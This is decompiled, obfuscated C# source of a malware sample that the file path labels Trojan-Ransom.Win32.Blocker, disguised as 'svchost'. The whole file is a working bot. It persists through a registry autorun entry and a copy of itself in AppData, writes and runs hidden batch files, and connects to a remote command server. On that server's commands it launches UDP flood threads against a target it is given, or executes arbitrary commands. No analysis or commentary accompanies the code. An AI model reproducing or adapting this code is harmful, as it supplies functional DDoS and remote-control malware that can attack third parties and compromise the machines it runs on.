// Decompiled with JetBrains decompiler
// Type: .
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C36FFE9C-B1BC-4A63-84C1-A0B2B2252CF0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.iina-2cbe7d2335ef6f8be6280c790805ef9c1d7dd84d.exe

using \u0001;
using \u0004;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0004
{
  internal sealed class \u0004 : Form
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    public int \u0001 = 48975;
    public float \u0001 = 1.2f;
    public Thread \u0001;
    public IPEndPoint \u0001;
    public Socket \u0001 = (Socket) null;
    private List<Thread> \u0001;
    private bool \u0001 = false;
    private byte[] \u0001;
    private IPEndPoint \u0002;
    public string \u0001 = Path.GetFileName(Application.ExecutablePath);
    private IContainer \u0001 = (IContainer) null;

    public \u0004() => this.\u0005();

    private void \u0003([In] object obj0, [In] EventArgs obj1)
    {
      string str1 = \u0004.\u0004.\u0001(869);
      string str2 = \u001A\u0003.\u0083\u0002(\u001D\u0003.\u0084\u0004(), \u0004.\u0004.\u0001(1019));
      StreamWriter streamWriter1 = new StreamWriter(str2);
      \u0017\u0002.\u007E\u0088\u0004((object) streamWriter1, \u0004.\u0004.\u0001(1044));
      \u0017\u0002.\u007E\u0088\u0004((object) streamWriter1, str1);
      \u0005\u0002.\u007E\u0087\u0004((object) streamWriter1);
      \u0005\u0002.\u007E\u0086\u0004((object) streamWriter1);
      ProcessStartInfo processStartInfo1 = new ProcessStartInfo(str2);
      \u0093.\u007E\u009A((object) processStartInfo1, true);
      \u007F\u0003.\u007E\u009B((object) processStartInfo1, ProcessWindowStyle.Hidden);
      Process process1 = \u000F\u0002.\u0097(processStartInfo1);
      ProcessStartInfo processStartInfo2 = (ProcessStartInfo) null;
      string[] strArray = new string[7]
      {
        \u0004.\u0004.\u0001(1057),
        this.\u0001,
        \u0004.\u0004.\u0001(1118),
        \u008D\u0002.\u009B\u0002(Environment.SpecialFolder.ApplicationData),
        \u0004.\u0004.\u0001(1167),
        this.\u0001,
        \u0004.\u0004.\u0001(1172)
      };
      string str3 = \u0010\u0003.\u0086\u0002(strArray);
      string str4 = \u001A\u0003.\u0083\u0002(\u001D\u0003.\u0084\u0004(), \u0004.\u0004.\u0001(1241));
      StreamWriter streamWriter2 = new StreamWriter(str4);
      \u0017\u0002.\u007E\u0088\u0004((object) streamWriter2, \u0004.\u0004.\u0001(1044));
      \u0017\u0002.\u007E\u0088\u0004((object) streamWriter2, str3);
      \u0005\u0002.\u007E\u0087\u0004((object) streamWriter2);
      \u0005\u0002.\u007E\u0086\u0004((object) streamWriter2);
      ProcessStartInfo processStartInfo3 = new ProcessStartInfo(str4);
      \u0093.\u007E\u009A((object) processStartInfo3, true);
      \u007F\u0003.\u007E\u009B((object) processStartInfo3, ProcessWindowStyle.Hidden);
      Process process2 = \u000F\u0002.\u0097(processStartInfo3);
      processStartInfo2 = (ProcessStartInfo) null;
      RegistryKey registryKey = \u0006\u0003.\u007E\u0008\u0004((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1266), true);
      if (\u009C.\u007E\u000E\u0004((object) registryKey, \u0004.\u0004.\u0001(1327)) == null)
        \u008F\u0002.\u007E\u000F\u0004((object) registryKey, \u0004.\u0004.\u0001(1327), (object) \u007F\u0002.\u0084\u0002(\u008D\u0002.\u009B\u0002(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1167), this.\u0001));
      if (!\u0087\u0002.\u001F\u0004(\u007F\u0002.\u0084\u0002(\u008D\u0002.\u009B\u0002(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1167), this.\u0001)))
        \u0090\u0002.\u0080\u0004(\u001D\u0003.\u0005(), \u007F\u0002.\u0084\u0002(\u008D\u0002.\u009B\u0002(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1167), this.\u0001));
      this.\u0001 = new IPEndPoint(\u0013\u0002.\u0082(\u0003.Default.DNS)[0], this.\u0001);
      this.\u0001 = new Thread(new ThreadStart(this.\u0003));
      \u0093.\u007E\u0019\u0003((object) this.\u0001, true);
      this.\u0003(true);
    }

    public void \u0003([In] bool obj0)
    {
      while (true)
      {
        try
        {
          this.\u0001 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          \u009A\u0002.\u007E\u0088((object) this.\u0001, (EndPoint) this.\u0001);
          if (!\u008E.\u007E\u0087((object) this.\u0001))
            break;
          int num = \u009B.\u007E\u0089((object) this.\u0001, this.\u0003(\u007F\u0002.\u0084\u0002(\u0004.\u0004.\u0001(1340), this.\u0001.ToString(), \u0004.\u0004.\u0001(1353))));
          if (obj0)
            \u0005\u0002.\u007E\u0017\u0003((object) this.\u0001);
          break;
        }
        catch
        {
        }
      }
    }

    public void \u0003()
    {
      while (true)
      {
        bool flag = true;
        try
        {
          if (this.\u0001 != null && \u008E.\u007E\u0087((object) this.\u0001))
          {
            string str1 = string.Empty;
            do
            {
              flag = true;
              byte[] numArray = new byte[128];
              int num = \u009B.\u007E\u008B((object) this.\u0001, numArray);
              str1 = \u001A\u0003.\u0083\u0002(str1, \u0017\u0003.\u007E\u0002\u0004((object) \u0016\u0002.\u0003\u0004(), numArray, 0, num));
            }
            while (\u001C\u0002.\u007E\u001D\u0002((object) str1, \u0004.\u0004.\u0001(1353)) <= -1);
            string str2 = \u0002\u0003.\u007E\u0080\u0002((object) str1, \u0004.\u0004.\u0001(1353), \u0004.\u0004.\u0001(1358));
            string str3 = str2;
            if (str3 != null)
            {
              if (!\u0091\u0002.\u0014\u0002(str3, \u0004.\u0004.\u0001(1359)))
              {
                if (!\u0091\u0002.\u0014\u0002(str3, \u0004.\u0004.\u0001(1380)))
                {
                  if (!\u0091\u0002.\u0014\u0002(str3, \u0004.\u0004.\u0001(1393)))
                  {
                    if (!\u0091\u0002.\u0014\u0002(str3, \u0004.\u0004.\u0001(1410)))
                    {
                      if (!\u0091\u0002.\u0014\u0002(str3, \u0004.\u0004.\u0001(1427)))
                      {
                        if (\u0091\u0002.\u0014\u0002(str3, \u0004.\u0004.\u0001(1444)))
                        {
                          RegistryKey registryKey = \u0006\u0003.\u007E\u0008\u0004((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1266), true);
                          if (\u009C.\u007E\u000E\u0004((object) registryKey, \u0004.\u0004.\u0001(1327)) != null)
                            \u0017\u0002.\u007E\u0007\u0004((object) registryKey, \u0004.\u0004.\u0001(1327));
                        }
                      }
                      else
                      {
                        this.\u0001 = false;
                        foreach (Thread thread in this.\u0001.ToArray())
                          \u0005\u0002.\u007E\u0018\u0003((object) thread);
                      }
                    }
                    else
                    {
                      \u0003.Default.Active = false;
                      \u0005\u0002.\u007E\u008F((object) \u0003.Default);
                    }
                  }
                  else
                  {
                    \u0003.Default.Active = true;
                    \u0005\u0002.\u007E\u008F((object) \u0003.Default);
                  }
                }
                else
                {
                  \u0093.\u007E\u008C((object) this.\u0001, true);
                  this.\u0003(false);
                }
              }
              else
              {
                int num1 = \u009B.\u007E\u0089((object) this.\u0001, this.\u0003(\u0004.\u0004.\u0001(1457)));
              }
            }
            if (\u0003.Default.Active)
            {
              string str4;
              if (\u0018\u0002.\u007E\u001B\u0002((object) str2, \u0004.\u0004.\u0001(1486)))
              {
                string str5 = \u0016\u0003.\u007E\u0081\u0002((object) str2, 0, 9);
                string str6 = \u0004.\u0004.\u0001(1358);
                str4 = \u0004.\u0004.\u0001(1358);
                for (int index = 0; index < \u0092.\u007E\u0017\u0002((object) str5); ++index)
                {
                  char ch = \u0002\u0002.\u007E\u0016\u0002((object) str5, index);
                  if (\u0091\u0002.\u0015\u0002(ch.ToString(), \u0004.\u0004.\u0001(1499)))
                  {
                    \u001A\u0003 obj = \u001A\u0003.\u0083\u0002;
                    string str7 = str6;
                    ch = \u0002\u0002.\u007E\u0016\u0002((object) str5, index);
                    string str8 = ch.ToString();
                    str6 = obj(str7, str8);
                  }
                  else
                    break;
                }
                str4 = \u0002\u0003.\u007E\u0080\u0002((object) str5, str6, \u0004.\u0004.\u0001(1358));
                string str9 = \u0002\u0003.\u007E\u0080\u0002((object) str6, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                string str10 = \u0002\u0003.\u007E\u0080\u0002((object) str5, str9, \u0004.\u0004.\u0001(1358));
                string str11 = \u0002\u0003.\u007E\u0080\u0002((object) str10, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                this.\u0003(1, new IPEndPoint(\u001E\u0002.\u0083(str9), \u0004\u0002.\u009E\u0002(str11)));
                this.\u0001 = true;
              }
              if (\u0018\u0002.\u007E\u001B\u0002((object) str2, \u0004.\u0004.\u0001(1504)))
              {
                string str12 = \u0016\u0003.\u007E\u0081\u0002((object) str2, 0, 9);
                string str13 = \u0004.\u0004.\u0001(1358);
                str4 = \u0004.\u0004.\u0001(1358);
                for (int index = 0; index < \u0092.\u007E\u0017\u0002((object) str12); ++index)
                {
                  char ch = \u0002\u0002.\u007E\u0016\u0002((object) str12, index);
                  if (\u0091\u0002.\u0015\u0002(ch.ToString(), \u0004.\u0004.\u0001(1499)))
                  {
                    \u001A\u0003 obj = \u001A\u0003.\u0083\u0002;
                    string str14 = str13;
                    ch = \u0002\u0002.\u007E\u0016\u0002((object) str12, index);
                    string str15 = ch.ToString();
                    str13 = obj(str14, str15);
                  }
                  else
                    break;
                }
                str4 = \u0002\u0003.\u007E\u0080\u0002((object) str12, str13, \u0004.\u0004.\u0001(1358));
                string str16 = \u0002\u0003.\u007E\u0080\u0002((object) str13, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                string str17 = \u0002\u0003.\u007E\u0080\u0002((object) str12, str16, \u0004.\u0004.\u0001(1358));
                string str18 = \u0002\u0003.\u007E\u0080\u0002((object) str17, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                this.\u0003(2, new IPEndPoint(\u001E\u0002.\u0083(str16), \u0004\u0002.\u009E\u0002(str18)));
                this.\u0001 = true;
              }
              if (\u0018\u0002.\u007E\u001B\u0002((object) str2, \u0004.\u0004.\u0001(1517)))
              {
                string str19 = \u0016\u0003.\u007E\u0081\u0002((object) str2, 0, 9);
                string str20 = \u0004.\u0004.\u0001(1358);
                str4 = \u0004.\u0004.\u0001(1358);
                for (int index = 0; index < \u0092.\u007E\u0017\u0002((object) str19); ++index)
                {
                  char ch = \u0002\u0002.\u007E\u0016\u0002((object) str19, index);
                  if (\u0091\u0002.\u0015\u0002(ch.ToString(), \u0004.\u0004.\u0001(1499)))
                  {
                    \u001A\u0003 obj = \u001A\u0003.\u0083\u0002;
                    string str21 = str20;
                    ch = \u0002\u0002.\u007E\u0016\u0002((object) str19, index);
                    string str22 = ch.ToString();
                    str20 = obj(str21, str22);
                  }
                  else
                    break;
                }
                str4 = \u0002\u0003.\u007E\u0080\u0002((object) str19, str20, \u0004.\u0004.\u0001(1358));
                string str23 = \u0002\u0003.\u007E\u0080\u0002((object) str20, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                string str24 = \u0002\u0003.\u007E\u0080\u0002((object) str19, str23, \u0004.\u0004.\u0001(1358));
                string str25 = \u0002\u0003.\u007E\u0080\u0002((object) str24, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                this.\u0003(3, new IPEndPoint(\u001E\u0002.\u0083(str23), \u0004\u0002.\u009E\u0002(str25)));
                this.\u0001 = true;
              }
              if (\u0018\u0002.\u007E\u001B\u0002((object) str2, \u0004.\u0004.\u0001(1530)))
              {
                string str26 = \u0016\u0003.\u007E\u0081\u0002((object) str2, 0, 9);
                string str27 = \u0004.\u0004.\u0001(1358);
                str4 = \u0004.\u0004.\u0001(1358);
                for (int index = 0; index < \u0092.\u007E\u0017\u0002((object) str26); ++index)
                {
                  char ch = \u0002\u0002.\u007E\u0016\u0002((object) str26, index);
                  if (\u0091\u0002.\u0015\u0002(ch.ToString(), \u0004.\u0004.\u0001(1499)))
                  {
                    \u001A\u0003 obj = \u001A\u0003.\u0083\u0002;
                    string str28 = str27;
                    ch = \u0002\u0002.\u007E\u0016\u0002((object) str26, index);
                    string str29 = ch.ToString();
                    str27 = obj(str28, str29);
                  }
                  else
                    break;
                }
                str4 = \u0002\u0003.\u007E\u0080\u0002((object) str26, str27, \u0004.\u0004.\u0001(1358));
                string str30 = \u0002\u0003.\u007E\u0080\u0002((object) str27, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                string str31 = \u0002\u0003.\u007E\u0080\u0002((object) str26, str30, \u0004.\u0004.\u0001(1358));
                string str32 = \u0002\u0003.\u007E\u0080\u0002((object) str31, \u0004.\u0004.\u0001(1499), \u0004.\u0004.\u0001(1358));
                this.\u0003(4, new IPEndPoint(\u001E\u0002.\u0083(str30), \u0004\u0002.\u009E\u0002(str32)));
                this.\u0001 = true;
              }
              if (\u0018\u0002.\u007E\u001B\u0002((object) str2, \u0004.\u0004.\u0001(1543)))
              {
                string str33 = \u0016\u0003.\u007E\u0081\u0002((object) str2, 0, 8);
                string str34 = \u001A\u0003.\u0083\u0002(\u001D\u0003.\u0084\u0004(), \u0004.\u0004.\u0001(1556));
                StreamWriter streamWriter = new StreamWriter(str34);
                \u0017\u0002.\u007E\u0088\u0004((object) streamWriter, \u0004.\u0004.\u0001(1044));
                \u0017\u0002.\u007E\u0088\u0004((object) streamWriter, str33);
                \u0005\u0002.\u007E\u0087\u0004((object) streamWriter);
                \u0005\u0002.\u007E\u0086\u0004((object) streamWriter);
                ProcessStartInfo processStartInfo = new ProcessStartInfo(str34);
                \u0093.\u007E\u009A((object) processStartInfo, true);
                \u007F\u0003.\u007E\u009B((object) processStartInfo, ProcessWindowStyle.Hidden);
                Process process = \u000F\u0002.\u0097(processStartInfo);
              }
            }
          }
        }
        catch
        {
          \u0093.\u007E\u008C((object) this.\u0001, true);
          this.\u0003(false);
        }
      }
    }

    public void \u0003([In] int obj0, [In] IPEndPoint obj1)
    {
      this.\u0002 = obj1;
      // ISSUE: reference to a compiler-generated method
      MemoryStream input = new MemoryStream(\u0005.\u0001.\u0003());
      BinaryReader binaryReader = new BinaryReader((Stream) input);
      this.\u0001 = \u0086\u0002.\u007E\u001B\u0004((object) binaryReader, 1024);
      \u0005\u0002.\u007E\u0016\u0004((object) input);
      this.\u0001 = new List<Thread>();
      if (obj0 == 1)
      {
        for (int index = 0; index < 50; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0004)));
          \u0093.\u007E\u0019\u0003((object) this.\u0001[index], true);
          \u0005\u0002.\u007E\u0017\u0003((object) this.\u0001[index]);
        }
      }
      if (obj0 == 2)
      {
        for (int index = 0; index < 100; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0004)));
          \u0093.\u007E\u0019\u0003((object) this.\u0001[index], true);
          \u0005\u0002.\u007E\u0017\u0003((object) this.\u0001[index]);
        }
      }
      if (obj0 == 3)
      {
        for (int index = 0; index < 150; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0004)));
          \u0093.\u007E\u0019\u0003((object) this.\u0001[index], true);
          \u0005\u0002.\u007E\u0017\u0003((object) this.\u0001[index]);
        }
      }
      if (obj0 != 4)
        return;
      for (int index = 0; index < 200; ++index)
      {
        this.\u0001.Add(new Thread(new ThreadStart(this.\u0004)));
        \u0093.\u007E\u0019\u0003((object) this.\u0001[index], true);
        \u0005\u0002.\u007E\u0017\u0003((object) this.\u0001[index]);
      }
    }

    private void \u0004()
    {
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
      while (this.\u0001)
      {
        try
        {
          int num = \u008C\u0002.\u007E\u008A((object) socket, this.\u0001, SocketFlags.None, (EndPoint) this.\u0002);
        }
        catch
        {
        }
      }
    }

    public byte[] \u0003([In] string obj0) => \u001E\u0003.\u007E\u009F\u0003((object) \u0016\u0002.\u0003\u0004(), obj0);

    protected override void Dispose([In] bool obj0)
    {
      if (obj0 && this.\u0001 != null)
        \u0005\u0002.\u007E\u0013\u0002((object) this.\u0001);
      \u0093.\u001F((object) this, obj0);
    }

    private void \u0005()
    {
      \u0005\u0002.\u0012((object) this);
      \u0095.\u000F((object) this, AccessibleRole.None);
      \u0008\u0003.\u0013((object) this, new SizeF(6f, 13f));
      \u009C\u0002.\u0014((object) this, AutoScaleMode.Font);
      \u0080\u0002.\u0017((object) this, new Size(10, 10));
      \u0093.\u0018((object) this, false);
      \u0090.\u0016((object) this, FormBorderStyle.None);
      \u0093.\u0019((object) this, false);
      \u0093.\u001A((object) this, false);
      \u0017\u0002.\u0010((object) this, \u0004.\u0004.\u0001(1573));
      \u009E.\u001B((object) this, 0.0);
      \u0093.\u001D((object) this, false);
      \u0093.\u001C((object) this, false);
      \u0082\u0002.\u001E((object) this, new EventHandler(this.\u0003));
      \u0093.\u0011((object) this, false);
    }

    static \u0004() => \u0003.\u0003();
  }
}
